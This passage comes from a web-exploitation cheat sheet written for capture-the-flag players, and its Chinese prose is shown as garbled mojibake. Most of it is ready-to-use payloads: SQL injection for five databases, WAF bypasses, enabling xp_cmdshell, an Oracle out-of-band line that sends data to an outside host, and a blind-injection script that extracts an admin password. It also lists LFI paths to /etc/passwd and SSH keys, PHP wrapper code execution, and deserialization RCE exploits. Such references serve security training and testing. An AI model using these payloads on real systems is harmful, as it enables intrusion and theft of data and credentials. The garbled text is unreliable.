        - e.g. ç”¨åœ¨ä¸èƒ½ä½¿ç”¨å•å¼•å·æ—¶(`'` => `\'`)
         - CHAR()ä¹Ÿå¯ä»¥è¾¾åˆ°ç±»ä¼¼æ•ˆæœ
             - `'admin'` => `CHAR(97, 100, 109, 105, 110)`
- æ³¨è§£ï¼š
    - `#`
    - `--`
    - `/**/`
        - ä¸€ä¸ª`*/`å¯ä»¥é—­åˆå‰é¢å¤šä¸ª`/*`
    - `/*! 50001 select * from test */`
        - å¯æ¢æµ‹ç‰ˆæœ¬
        - e.g. `SELECT /*!32302 1/0, */ 1 FROM tablename`
    - `
        - MySQL <= 5.5
    - `;`
        - PDOæ”¯æŒå¤šè¯­å¥
- information_schema
    - mysql >= 5.0
- Stacking Query
    - é¢„è®¾PHP+MySQLä¸æ”¯æŒStacking Query
    - ä½†PDOå¯ä»¥Stacking Query
- å…¶å®ƒï¼š
    - @@version
        - åŒversion()
    - user()
        - current_user
        - current_user()
        - current user 
    - system_user()
        - database system user
    - database()
        - schema()
        - current database
    - @@basedir
        - MySQLå®‰è£…è·¯å¾„
    - @@datadir
        - Location of db file
    - @@hostname
    - @@version_compile_os
        - Operating System
    - @@innodb_version
    - MD5()
    - SHA1()
    - COMPRESS() / UNCOMPRESS()
    - group_concat()
        - åˆä½µå¤šæ¡ç»“æœ
            - e.g. `select group_concat(username) from users;` ä¸€æ¬¡è¿”å›æ‰€æœ‰ä½¿ç”¨è€…å
    - greatest()
        - `greatest(a, b)`è¿”å›a, bä¸­æœ€å¤§çš„
        - `greatest(1, 2)=2`
            - 1
        - `greatest(1, 2)=1`
            - 0
    - between a and b
        - ä»‹äºaåˆ°bä¹‹é—´
        - `greatest(1, 2) between 1 and 3`
            - 1
    - regexp
        - `SELECT 'abc' regexp '.*'`
            - 1
    - Collation
        - `*_ci` case insensitive collation ä¸åŒºåˆ†å¤§å°å†™
        - `*_cs` case sensitive collation åŒºåˆ†å¤§å°å†™
        - `*_bin` binary case sensitive collation åŒºåˆ†å¤§å°å†™

- Union Based
    - åˆ¤æ–­columnæ•°
        - `union select 1,2,3...N`
        - `order by N` æ‰¾æœ€åä¸€ä¸ªæˆåŠŸçš„N
    - `AND 1=2 UNION SELECT 1, 2, password FROM admin--+`
    - `LIMIT N, M` è·³è¿‡å‰Nç¬”ï¼ŒæŠ“Mç¬”
    - çˆ†èµ„æ–™åº“å
        - `union select 1,2,schema_name from information_schema.schemata limit 1,1`
    - çˆ†è¡¨å
        - `union select 1,2,table_name from information_schema.tables where table_schema='mydb' limit 0,1`
        - `union select 1,2,table_name from information_schema.columns where table_schema='mydb' limit 0,1`
    - çˆ†Columnå
        - `union select 1,2,column_name from information_schema.columns where table_schema='mydb' limit 0,1`
    - MySQL User
        - `SELECT CONCAT(user, ":" ,password) FROM mysql.user;`
- Error Based
    - é•¿åº¦é™åˆ¶
        - é”™è¯¯è®¯æ¯æœ‰é•¿åº¦é™åˆ¶
        - `#define ERRMSGSIZE (512)`
    - Overflow
        - MySQL > 5.5.5 overflowæ‰ä¼šæœ‰é”™è¯¯è®¯æ¯
        - `SELECT ~0` => `18446744073709551615`
        - `SELECT ~0 + 1` => ERROR
        - `SELECT exp(709)` => `8.218407461554972e307`
        - `SELECT exp(710)` => ERROR
        - è‹¥æŸ¥è¯¢æˆåŠŸï¼Œä¼šè¿”å›0
            - `SELECT exp(~(SELECT * FROM (SELECT user())x));`
            - `ERROR 1690(22003):DOUBLE value is out of range in 'exp(~((SELECT 'root@localhost' FROM dual)))'`
        - `select (select(!x-~0)from(select(select user())x)a);`
            - `ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'`
            - MySQL > 5.5.53 ä¸ä¼šæ˜¾ç¤ºæŸ¥è¯¢ç»“æœ
    - xpath
        - extractvalue (æœ‰é•¿åº¦é™åˆ¶ï¼Œ32ä½)
            - `select extractvalue(1,concat(0x7e,(select @@version),0x7e));`
            - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
        - updatexml (æœ‰é•¿åº¦é™åˆ¶ï¼Œ32ä½)
            - `select updatexml(1,concat(0x7e,(select @@version),0x7e),1);`
            - `ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'`
    - ä¸»é”®é‡å¤
        - `select count(*) from test group by concat(version(),floor(rand(0)*2));`
            - `ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'`
    - å…¶å®ƒå‡½æ•° (5.7)
        - `select ST_LatFromGeoHash(version());`
        - `select ST_LongFromGeoHash(version());`
        - `select GTID_SUBSET(version(),1);`
        - `select GTID_SUBTRACT(version(),1);`
        - `select ST_PointFromGeoHash(version(),1);`
    - çˆ†åº“åã€è¡¨åã€å­—æ®µå
        - å½“è¿‡æ»¤`information_schema`ç­‰å…³é”®å­—æ—¶ï¼Œå¯ä»¥ç”¨ä¸‹é¢æ–¹æ³•çˆ†åº“å
            - `select 1,2,3 from users where 1=abc();`
                - `ERROR 1305 (42000): FUNCTION fl4g.abc does not exist`
        - çˆ†è¡¨å
            - `select 1,2,3 from users where Polygon(id);`
            - ``select 1,2,3 from users where linestring(id);``
                - ```ERROR 1367 (22007): Illegal non geometric '`fl4g`.`users`.`id`' value found during parsing```
        - çˆ†Column
            - `select 1,2,3 from users where (select * from  (select * from users as a join users as b)as c);`
                - `ERROR 1060 (42S21): Duplicate column name 'id'`
            - `select 1,2,3 from users where (select * from  (select * from users as a join users as b using(id))as c);`
                - `ERROR 1060 (42S21): Duplicate column name 'username'`
- Blind Based (Time/Boolean)
    - Boolean
        - ã€Œæœ‰ã€è·Ÿã€Œæ²¡æœ‰ã€
        - `id=87 and length(user())>0`
        - `id=87 and length(user())>100`
        - `id=87 and ascii(mid(user(),1,1))>100`
        - `id=87 or ((select user()) regexp binary '^[a-z]')`
    - Time
        - ç”¨åœ¨å•¥ç»“æœéƒ½çœ‹ä¸åˆ°æ—¶
        - `id=87 and if(length(user())>0, sleep(10), 1)=1`
        - `id=87 and if(length(user())>100, sleep(10), 1)=1`
        - `id=87 and if(ascii(mid(user(),1,1))>100, sleep(10), 1)=1`
- ç»•è¿‡ç©ºç™½æ£€æŸ¥
    - `id=-1/**/UNION/**/SELECT/**/1,2,3`
    - `id=-1%09UNION%0DSELECT%0A1,2,3`
    - `id=(-1)UNION(SELECT(1),2,3)`

- å®½å­—èŠ‚æ³¨å…¥
    - `addslashes()`ä¼šè®©`'`å˜`\'`
    - åœ¨`GBK`ç¼–ç ä¸­ï¼Œä¸­æ–‡å­—ç”¨ä¸¤ä¸ªBytesè¡¨ç¤º
        - å…¶ä»–å¤šå­—èŠ‚ç¼–ç ä¹Ÿå¯
        - ä½†è¦ä½ä½èŒƒå›´æœ‰åŒ…å«`0x5c`(`\`)
    - ç¬¬ä¸€ä¸ªByteè¦>128æ‰æ˜¯ä¸­æ–‡
    - `%df'` => `%df\'` => `è¿'` (æˆåŠŸé€ƒé€¸)

- Order byæ³¨å…¥
    - å¯ä»¥é€è¿‡`asc`ã€`desc`ç®€å•åˆ¤æ–­
        - `?sort=1 asc`
        - `?sort=1 desc`
    - åé¢ä¸èƒ½æ¥UNION
    - å·²çŸ¥å­—æ®µå (å¯ä»¥ç›²æ³¨)
        - `?order=IF(1=1, username, password)`
    - åˆ©ç”¨æŠ¥é”™
        - `?order=IF(1=1,1,(select 1 union select 2))` æ­£ç¡®
        - `?order=IF(1=2,1,(select 1 union select 2))` é”™è¯¯
        - `?order=IF(1=1,1,(select 1 from information_schema.tables))` æ­£å¸¸
        - `?order=IF(1=2,1,(select 1 from information_schema.tables))` é”™è¯¯
    - Time Based
        - `?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` æ­£å¸¸
        - `?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))` sleep 2ç§’

- group by with rollup
    - `' or 1=1 group by pwd with rollup limit 1 offset 2#`

- å°†å­—ç¬¦ä¸²è½¬æˆçº¯æ•°å­—
    - å­—ç¬¦ä¸² -> 16è¿›åˆ¶ -> 10è¿›åˆ¶
    - `conv(hex(YOUR_DATA), 16, 10)`
    - è¿˜åŸï¼š`unhex(conv(DEC_DATA,10,16))`
    - éœ€æ³¨æ„ä¸è¦Overflow

- ä¸ä½¿ç”¨é€—å·
    - `LIMIT N, M` => `LIMIT M OFFSET N`
    - `mid(user(), 1, 1)` => `mid(user() from 1 for 1)`
    - `UNION SELECT 1,2,3` => `UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)`

- å¿«é€ŸæŸ¥æ‰¾å¸¦å…³é”®å­—çš„è¡¨
    - `select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%');
    `

- innodb
    - è¡¨å¼•æ“ä¸ºinnodb
    - MySQL > 5.5
    - innodb_table_statsã€innodb_table_indexå­˜æ”¾æ‰€æœ‰åº“åè¡¨å
    - `select table_name from mysql.innodb_table_stats where database_name=èµ„æ–™åº“å;`
    - Example: [Codegate2018 prequal - simpleCMS](https://github.com/w181496/CTF/tree/master/codegate2018-prequal/simpleCMS)

- Bypass WAF

    - `select password` => `SelEcT password` (å¤§å°å†™)
    - `select password` => `select/**/password` (ç»•ç©ºç™½)
    - `select password` => `s%65lect%20password` (URLencode)
    - `select password` => `select(password)` (ç»•ç©ºç™½)
    - `select password` => `select%0apassword` (ç»•ç©ºç™½)
        - %09, %0a, %0b, %0c, %0d, %a0
    - `select password from admin` => `select password /*!from*/ admin` (MySQLæ³¨è§£)
    - `information_schema.schemata` => ``` `information_schema`.schemata ``` (ç»•å…³é”®å­—/ç©ºç™½)
        - ``` select xxx from`information_schema`.schemata``` 
    - `select pass from user where id='admin'` => `select pass from user where id=0x61646d696e` (ç»•å¼•å·)
        - `id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e))`
    - `?id=0e2union select 1,2,3` (ç§‘å­¦è®°å·)
        - `?id=1union select 1,2,3`ä¼šçƒ‚
        - `?id=0e1union(select~1,2,3)` (~)
        - `?id=.1union select 1,2,3` (ç‚¹)
    - `WHERE` => `HAVING` (ç»•å…³é”®å­—)
    - `AND` => `&&` (ç»•å…³é”®å­—)
        - `OR` => `||`
        - `=` => `LIKE`
        - `a = 'b'` => `not a > 'b' and not a < 'b'`
        - `> 10` => `not between 0 and 10`
    - `LIMIT 0,1` => `LIMIT 1 OFFSET 0` (ç»•é€—å·)
        - `substr('kaibro',1,1)` => `substr('kaibro' from 1 for 1)`
    - Multipart/form-dataç»•è¿‡
        - http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/
    - ä¼ªé€ User-Agent
        - e.g. æœ‰äº›WAFä¸å°google bot

## MSSQL

- å­å­—ç¬¦ä¸²ï¼š
    - `SUBSTRING("abc", 1, 1) => 'a'`
- Ascii function
    - `ascii('A') => 65 `
- Char function
    - `char(65) => 'a'`
- Concatenation
    - `+`
    - `'a'+'b' => 'ab'`
- Delay function
    - `WAIT FOR DELAY '0:0:10'`
- ç©ºç™½å­—å…ƒ
    - `01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20`
- IFè¯­å¥
    - IF condition true-part ELSE false-part
    - `IF (1=1) SELECT 'true' ELSE SELECT 'false'`
- æ³¨è§£ï¼š
    - `--`
    - `/**/`
- TOP
    - MSSQLæ²¡æœ‰`LIMIT N, M`çš„ç”¨æ³•
    - `SELECT TOP 87 * FROM xxx` å–æœ€å‰é¢87ç¬”
    - å–ç¬¬78~87ç¬”
        - `SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87`
- å…¶å®ƒï¼š
    - db_name()
    - user_name()
    - @@servername
    - host_name()
- çˆ†DB name
    - ```DB_NAME(N)```
    - ```UNION SELECT NULL,DB_NAME(N),NULL--```
    - ```UNION SELECT NULL,name,NULL FROM master ..sysdatabases--```
    - `SELECT catalog_name FROM information_schema.schemata`
    - ```1=(select name from master.dbo.sysdatabases where dbid=5)```
- çˆ†è¡¨å
    - `SELECT table_catalog, table_name FROM information_schema.tables`
    - `SELECT name FROM sysobjects WHERE xtype='U'`
    - `ID=02';if (select top 1 name from DBname..sysobjects where xtype='U' and name not in ('table1', 'table2'))>0 select 1--`

- çˆ†column
    - `SELECT table_catalog, table_name, column_name FROM information_schema.columns`
    - `SELECT name FROM syscolumns WHERE id=object_id('news')`
    - `ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)>0 select 1--`
- Union Based
    - Columnå‹æ€å¿…é¡»ç›¸åŒ
    - å¯ç”¨`NULL`æ¥é¿å…
- Error Based
    - åˆ©ç”¨å‹åˆ«è½¬æ¢é”™è¯¯
    - `id=1 and user=0`

- åˆ¤æ–­æ˜¯å¦ç«™åº“åˆ†ç¦»
    - å®¢æˆ·ç«¯ä¸»æœºåï¼š`select host_name();`
    - æœåŠ¡ç«¯ä¸»æœºåï¼š`select @@servername; `
    - ä¸¤è€…ä¸åŒå³ç«™åº“åˆ†ç¦»

- xp_cmdshell
    - åœ¨MSSQL 2000é»˜è®¤å¼€å¯
    - MSSQL 2005ä¹‹åé»˜è®¤å…³é—­
    - æœ‰saæƒé™ï¼Œå¯é€è¿‡sp_configureé‡å¯å®ƒ
    
    ```
    EXEC sp_configure 'show advanced options',1
    RECONFIGURE 
    EXEC sp_configure 'xp_cmdshell',1
    RECONFIGURE
    ```
    - å…³é—­xp_cmdshell
    
    ```
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure'xp_cmdshell', 0;
    RECONFIGURE;
    ```

- å¿«é€ŸæŸ¥æ‰¾å¸¦å…³é”®å­—çš„è¡¨
    - `SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%');`

- Unicodeç»•è¿‡
    - IIS å¯¹ Unicode ç¼–ç æ˜¯å¯ä»¥è§£æçš„ï¼Œå³ s%u0065lect ä¼šè¢«è§£æä¸º select

## Oracle

- `SELECT`è¯­å¥å¿…é¡»åŒ…å«`FROM`
    - ç”¨`dual`è¡¨
- å­å­—ç¬¦ä¸²ï¼š
    - `SUBSTR("abc", 1, 1) => 'a'`
- ç©ºç™½å­—å…ƒ
    - `00 0A 0D 0C 09 20`
- IFè¯­å¥
    - `IF condition THEN true-part [ELSE false-part] END IF`
- æ³¨è§£ï¼š
    - `--`
- å…¶å®ƒ
    - `SYS.DATABASE_NAME`
        - current database
    - `USER`
        - current user
    - `SELECT banner FROM v$version where rownum=1`
        - database version
- åº“å
    - `SELECT DISTINCT OWNER FROM ALL_TABLES`
- è¡¨å
    - `SELECT OWNER, TABLE_NAME FROM ALL_TABLES`
- Column
    - `SELECT OWNER, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS`
- Union Based
    - Columnå‹æ€å¿…é¡»ç›¸åŒ
    - å¯ç”¨`NULL`æ¥é¿å…
    - `UNION SELECT 1, 'aa', null FROM dual`
- Error Based
    - `SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1`
- Out of band
    - `UTL_HTTP.request('http://kaibro.tw/'||(select user from dual))=1`

## SQLite

- å­å­—ç¬¦ä¸²ï¼š
    - `substr(â€œabc",1,1)   =>   'a'`
- Ascii function:
    - `unicode('d') => 100`
- legth
    - `length('ab') => 2`
- Concatenation
    - `||`
    - `'a' || 'b' => 'ab'` 
- Time Delay
    - `randomblob(100000000)`
- ç©ºç™½å­—å…ƒ
    - `0A 0D 0C 09 20`
- Case when
    - SQLiteæ²¡æœ‰`if`
    - å¯ä»¥ç”¨`Case When ... Then ...`ä»£æ›¿
    - `case when (æ¡ä»¶) then ... else ... end`
- æ³¨è§£
    - `--`
- çˆ†è¡¨å
    - `SELECT name FROM sqlite_master WHERE type='table'`
- çˆ†è¡¨ç»“æ„(å«Column)
    - `SELECT sql FROM sqlite_master WHERE type='table'`
- å…¶ä»–
    - `sqlite_version()`
    - sqliteæ— æ³•ä½¿ç”¨`\'`è·³è„±å•å¼•å·
- Boolean Based: SECCON 2017 qual SqlSRF

<details>
    <summary><b>Click here to view script</b></summary>

```ruby
# encoding: UTF-8

# sqlite injection (POST method) (äºŒåˆ†æœ)
# SECCON sqlsrfçˆ†adminå¯†ç  
require 'net/http'
require 'uri'

$url = 'http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi'
$ans = ''

(1..100).each do |i|
    l = 48
    r = 122

    while(l <= r)
        #puts "left: #{l}, right: #{r}"
        break if l == r

        mid = ((l + r) / 2)
        $query = "kaibro'union select '62084a9fa8872a1b917ef4442c1a734e' where (select unicode(substr(password,#{i},#{i})) from users where username='admin') > #{mid} and '1'='1"
        
        res = Net::HTTP.post_form URI($url), {"user" => $query, "pass" => "kaibro", "login" => "Login"}
        
        if res.body.include? 'document.location'
            l = mid + 1
        else
            r = mid
        end

    end
    $ans += l.chr
    puts $ans

end

```

</details>

## PostgreSQL

- å­å­—ç¬¦ä¸²
    - `substr("abc", 1, 1) => 'a'`
- Ascii function
    - `ascii('x') => 120`
- Char function
    - `chr(65) => A`
- Concatenation
    - `||`
    - `'a' || 'b' => 'ab'`
- Delay function
    - `pg_sleep(5)`
    - `GENERATE_SERIES(1, 1000000)`
- ç©ºç™½å­—å…ƒ
    - `0A 0D 0C 09 20`
- encode / decode
    - `encode('123\\000\\001', 'base64')` => `MTIzAAE=`
    - `decode('MTIzAAE=', 'base64')` => `123\000\001`
- ä¸æ”¯æŒlimit N, M
    - `limit a offset b` ç•¥è¿‡å‰bç¬”ï¼ŒæŠ“å‡ºaç¬”å‡ºæ¥
- æ³¨è§£
    - `--`
    - `/**/`
- çˆ†åº“å
    - `SELECT datname FROM pg_database`
- çˆ†è¡¨å
    - `SELECT tablename FROM pg_tables WHERE schemaname='dbname'`
- çˆ†Column
    - `SELECT column_name FROM information_schema.columns WHERE table_name='admin'`
- Dump all 
    - `array_to_string(array(select userid||':'||password from users),',')`
- å…¶å®ƒ
    - version()
    - current\_database()
    - user
        - current_user
        - `SELECT usename FROM pg_user;`
    - current\_schema
    - current\_query()
    - inet\_server\_addr()
    - inet\_server\_port()
    - inet\_client\_addr()
    - inet\_client\_port()
    - type conversion
        - `cast(count(*) as text)`
    - `md5('abc')`
    - `replace('abcdefabcdef', 'cd', 'XX')` => `abXXefabXXef`
    - `pg_read_file(filename, offset, length)`
        - è¯»æ¡£
        - åªèƒ½è¯»data_directoryä¸‹çš„
    - `pg_ls_dir(dirname)`
        - åˆ—ç›®å½•å†…å®¹
        - åªèƒ½åˆ—data_directoryä¸‹çš„

## ORM injection

https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications

- Hibernate
    - å•å¼•å·è·³è„±æ³•
        - MySQLä¸­ï¼Œå•å¼•å·ç”¨`\'`è·³è„±
        - HQLä¸­ï¼Œç”¨ä¸¤ä¸ªå•å¼•å·`''`è·³è„±
        - `'abc\''or 1=(SELECT 1)--'`
            - åœ¨HQLæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²
            - åœ¨MySQLæ˜¯å­—ç¬¦ä¸²+é¢å¤–SQLè¯­å¥
    - Magic Functionæ³•
        - PostgreSQLä¸­å†…å»º`query_to_xml('Arbitary SQL')`
        - Oracleä¸­æœ‰`dbms_xmlgen.getxml('SQL')`

HQL injection example (pwn2win 2017)

- ```order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select table_name from information_schema.columns limit 1)))',true,false,'')),1)```
    - Output: `ERROR: could not stat file "flag": No such file or directory`

- ```order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select column_name from information_schema.columns limit 1)))',true,false,'')),1)```
    - Output: `ERROR: could not stat file "secret": No such file or directory`
- `order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select secret from flag)))',true,false,'')),1)`
    - Output: `ERROR: could not stat file "CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}": No such file or directory`


## SQL Injection with MD5

- `$sql = "SELECT * FROM admin WHERE pass = '".md5($password, true)."'";`
- ffifdyop
    - md5: `276f722736c95d99e921722cf9ed621c`
    - to string: `'or'6<trash>`

## HTTP Parameter Pollution

- `id=1&id=2&id=3`
    - ASP.NET + IIS: `id=1,2,3`
    - ASP + IIS: `id=1,2,3`
    - PHP + Apache: `id=3`

## SQLmap

- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- Usage
    - `python sqlmap.py -u 'test.kaibro.tw/a.php?id=1'`
        - åº“å: `--dbs`
        - è¡¨å: `-D dbname --tables`
        - column: `-D dbname -T tbname --columns`
        - dump: `-D dbname -T tbname --dump`
            - `--start=1`
            - `--stop=5566`
        - DBA? `--is-dba`
        - çˆ†å¸å¯†: `--passwords`
        - çœ‹æƒé™: `--privileges`
        - æ‹¿shell: `--os-shell`
        - interative SQL: `--sql-shell`
        - è¯»æ¡£: `--file-read=/etc/passwd`
        - Delayæ—¶é—´: `--time-sec=10`
        - User-Agent: `--random-agent`
        - Thread: `--threads=10`
        - Level: `--level=3`
            - default: 1
        - `--technique`
            - default: `BEUSTQ`
        - Cookie: `--cookie="abc=55667788"`
        - Tor: `--tor --check-tor --tor-type=SOCKS5 --tor-port=9050`

# LFI

## Testing Payload

### Linux / Unix

- `./index.php`
- `././index.php`
- `.//index.php`
- `../../../../../../etc/passwd`
- `../../../../../../etc/passwd%00`
    - ä»…åœ¨5.3.0ä»¥ä¸‹å¯ç”¨
    - magic_quotes_gpcéœ€ä¸ºOFF
- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- `ï¼®ï¼®/ï¼®ï¼®/ï¼®ï¼®/etc/passwd`
- `/var/log/apache2/error.log`
- `/var/log/httpd/access_log`
- `/usr/local/apache2/conf/httpd.conf`
- `/etc/apache2/apache2.conf`
- `/etc/apache2/sites-available/000-default.conf`
- `/usr/local/etc/apache2/httpd.conf`
- `/etc/nginx/conf.d/default.conf`
- `/etc/nginx/nginx.conf`
- `/etc/nginx/sites-enabled/default`
- `/etc/nginx/sites-enabled/default.conf`
- `.htaccess`
- `/root/.bash_history`
- `/root/.ssh/id_rsa`
- `/root/.ssh/authorized_keys`

### Windows

- `C:/Windows/win.ini`
- `C:/boot.ini`
- `C:/apache/logs/access.log`
- `../../../../../../../../../boot.ini/.......................`
- `C:/windows/system32/drivers/etc/hosts`

## ç¯å¢ƒå˜é‡

- `../../../../proc/self/environ`
    - HTTP_User_Agentå¡php script

## logæ–‡ä»¶

- apache log
- mysql log
- ssh log
    - `/var/log/auth.log`


## php://filter

- `php://filter/convert.base64-encode/resource=index.php`
- `php://filter/read=string.rot13/resource=index.php`

## php://input

- `?page=php://input`
    - post data: `<?php system("net user"); ?>`
    - éœ€è¦æœ‰å¼€å¯`url_allow_include`ï¼Œ5.4.0ç›´æ¥åºŸé™¤

## phpinfo

- å¯¹serverä»¥form-dataä¸Šä¼ æ–‡ä»¶ï¼Œä¼šäº§ç”Ÿtmpæ¡£
- åˆ©ç”¨phpinfoå¾—åˆ°tmpæ¡£è·¯å¾„å’Œåç§°
- Get shell

## php session

- Sessionä¸€èˆ¬å­˜åœ¨`sess_{PHPSESSID}`ä¸­
- å¯ä»¥é€è¿‡ä¿®æ”¹Cookieå†LFIæ‹¿shell
- ä»¥ä¸‹ä¸ºå¸¸è§å­˜æ”¾è·¯å¾„
    - /var/tmp/
    - /tmp/
    - /var/lib/php5/
    - /var/lib/php/

## data://

- æ¡ä»¶
    - allow_url_fopen: On
    - allow_url_include: On
- ç”¨æ³•
    - `?file=data://text/plain,<?php phpinfo()?>`
    - `?file=data:text/plain,<?php phpinfo()?>`
    - `?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`

## zip / phar

- é€‚ç”¨éªŒè¯å‰¯æ¡£åæ—¶
- zip
    - æ–°å»ºzipï¼Œè£¡å¤´å‹ç¼©phpè„šæœ¬(å¯æ”¹å‰¯æ¡£å)
    - `?file=zip://myzip.zip#php.jpg`
- phar
    - ```php
        <?php
            $p = new PharData(dirname(__FILE__).'/phartest.zip',0,'phartest2',Phar::ZIP);
            $x = file_get_contents('./a.php');
            $p->addFromString('b.jpg', $x);
        ?>
    - æ„é€  `?file=phar://phartest.zip/b.jpg`

# ä¸Šä¼ æ¼æ´

## Javascriptæ£€æµ‹

- Burp Suite ä¸­é—´ä¿®æ”¹
- disable javascript

## Bypass MIME Detection

- Burpä¿®æ”¹Content-Type

## é»‘åå•åˆ¤æ–­å‰¯æ¡£å

- å¤§å°å†™ç»•è¿‡
    - pHP
    - AsP 
- ç©ºæ ¼ / ç‚¹ ç»•è¿‡
    - Windowsç‰¹æ€§
    - .php(ç©ºæ ¼)  // burpä¿®æ”¹
    - .asp.
- php3457
    - .php3
    - .php4
    - .php5
    - .php7
    - .pht
    - .phtml
- .htaccess
    ```
    <FilesMatch "kai">
    SetHandler application/x-httpd-php
    </FilesMatch>
    ```
- æ–‡ä»¶è§£ææ¼æ´

## Magic Number

- jpg
    - `FF D8 FF E0 00 10 4A 46 49 46`
- gif
    - `47 49 36 38 39 61`
- png
    - `89 50 4E 47`

## å…¶ä»–
- å¸¸è§åœºæ™¯ï¼šé…åˆæ–‡ä»¶è§£ææ¼æ´

# ååºåˆ—åŒ–

## PHP - Serialize() / Unserialize()

- `__construct()`
    - Objectè¢«newæ—¶è°ƒç”¨ï¼Œä½†unserialize()ä¸è°ƒç”¨
- `__destruct()`
    - Objectè¢«é”€æ¯æ—¶è°ƒç”¨
- `__wakeup()`
    - unserializeæ—¶è‡ªåŠ¨è°ƒç”¨
- `__sleep()`
    - è¢«serializeæ—¶è°ƒç”¨
- `__toString()`
    - ç‰©ä»¶è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è°ƒç”¨

<br>

- Value
    - String
        - `s:size:value;`
    - Integer
        - `i:value;`
    - Boolean
        - `b:value;` ('1' or '0')
    - NULL
        - `N;`
    - Array
        - `a:size:{key definition; value definition; (repeat per element)}`
    - Object
        - `O:strlen(class name):class name:object size:{s:strlen(property name):property name:property definition;(repeat per property)}`
    - å…¶ä»–
        - C - custom object
        - R - pointer reference


- Public / Private / Protected åºåˆ—åŒ–

    - ä¾‹å¦‚ï¼šclassåå­—ä¸º: `Kaibro`ï¼Œå˜é‡åå­—: `test`

    - è‹¥ä¸ºPublicï¼Œåºåˆ—åŒ–åï¼š
        - `...{s:4:"test";...}`
    - è‹¥ä¸ºPrivateï¼Œåºåˆ—åŒ–åï¼š
        - `...{s:12:"%00Kaibro%00test"}`
    - è‹¥ä¸ºProtectedï¼Œåºåˆ—åŒ–åï¼š
        - `...{s:7:"%00*%00test";...}`
    - Privateå’ŒProtectedä¼šå¤šä¸¤ä¸ªNULL byte

---

- Example
    
```php
    <?php

    class Kaibro {
        public $test = "ggininder";
        function __wakeup()
        {
            system("echo ".$this->test);
        }
    }

    $input = $_GET['str'];
    $kb = unserialize($input);
```

- Input: `.php?str=O:6:"Kaibro":1:{s:4:"test";s:3:";id";}`
- Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data) `

<br>

- Example 2 - Private

```php
    <?php

    class Kaibro {
        private $test = "ggininder";
        function __wakeup()
        {
            system("echo ".$this->test);
        }
    }

    $input = $_GET['str'];
    $kb = unserialize($input);

```

- Input: `.php?str=O:6:"Kaibro":1:{s:12:"%00Kaibro%00test";s:3:";id";}`

- Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

- CVE-2016-7124
    - å½±å“ç‰ˆæœ¬ï¼š
        - PHP5 < 5.6.25
        - PHP7 < 7.0.10
    - ç‰©ä»¶å±æ€§ä¸ªæ•°å¤§äºçœŸæ­£çš„å±æ€§ä¸ªæ•°ï¼Œä¼šç•¥è¿‡`__wakeup`çš„æ‰§è¡Œ
    - ååºåˆ—åŒ–ä¼šå¤±è´¥ï¼Œä½†æ˜¯`__destruct`ä¼šæ‰§è¡Œ
    - HITCON 2016

- å°ç‰¹æ€§
    - `O:+4:"test":1:{s:1:"a";s:3:"aaa";}`
    - `O:4:"test":1:{s:1:"a";s:3:"aaa";}`
    - ä¸¤è€…ç»“æœç›¸åŒ

## Python Pickle

- `dumps()` å°†ç‰©ä»¶åºåˆ—åŒ–æˆå­—ç¬¦ä¸²
- `loads()` å°†å­—ç¬¦ä¸²ååºåˆ—åŒ–

Example:

a.py:

```python
import os
import cPickle
import sys
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
    
shellcode = cPickle.dumps(Exploit())
print base64.b64encode(shellcode)
```

b.py:

```python
import os
import cPickle
import sys
import base64

s = raw_input(":")

print cPickle.loads(base64.b64decode(s))
```

```
$ python a.py > tmp
$ cat tmp | python b.py
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)
```

## Ruby/Rails Marshal

this one is not self-executing

this one actually relies on rails invoking a method on the resulting object after the deserialization

```ruby
erb = ERB.allocate
erb.instance_variable_set :@src, "`id`"
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result, "foo", ActiveSupport::Deprecation
hash = {depr => 'something'}
marshalled = Marshal.dump(hash)
print marshalled
```

